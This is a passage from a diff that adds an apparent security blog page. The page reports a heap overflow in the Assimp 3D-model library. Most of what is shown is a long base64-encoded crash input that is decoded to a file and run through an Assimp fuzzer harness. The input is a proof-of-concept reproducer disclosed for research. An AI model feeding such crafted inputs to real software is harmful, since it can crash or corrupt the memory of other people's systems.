+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6uoV6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6ury6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6uvq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6unq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6urq6urq6urqSEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">SEhIT1JEIiAgOCAgICAgNTU1NTU1NTU1NSA3ICAgICA1NTU1NTU1NDU1CQCATElHSFRPQi9FQ1R0
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">dDEwABBNDAxEAEVSgEQ1VlNIDQ0yKg0gMiA3SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISHkgCQkJCXttf0Q1VgoKVgrJycnJycnJ
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">ycnJycnJycnJycnJycnJycnJTWPpAGX6AABoDER/NjVWCgEKZAAAZXlWLFdJQUxfCgpWClYQTQxN
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">RVNIJkR/RYIAAGV5VixXSUEAAFYQTQwMZABEIkNIT1JEIiAFICAgICAgNTU1NTU1NTU1NSA3ICAg
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">ICA1NTU1NTU1NTU1IDcgICAgIAkJAIBMSUdIVE9CL0VDVHR0MTAA&#34;</span> | base64 -d &gt; crash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>./assimp_fuzzer ./crash
+</span></span></code></pre></div>
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/heap-overflow">heap-overflow</a></li>
+					
+					<li><a href="/tags/assimp">assimp</a></li>
+					
+					<li><a href="/tags/memory">memory</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/arzedlab/" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://www.linkedin.com/in/ravshan-rikhsiev/" rel="me" title="Linkedin"><i data-feather="linkedin"></i></a>
+    <a class="border"></a><a class="soc" href="https://twitter.com/arzedlab/" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2025  © Ravshan | Made with Love ❤️ <a href="https://twitter.com/arzedlab/"> My Twitter 🪽</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
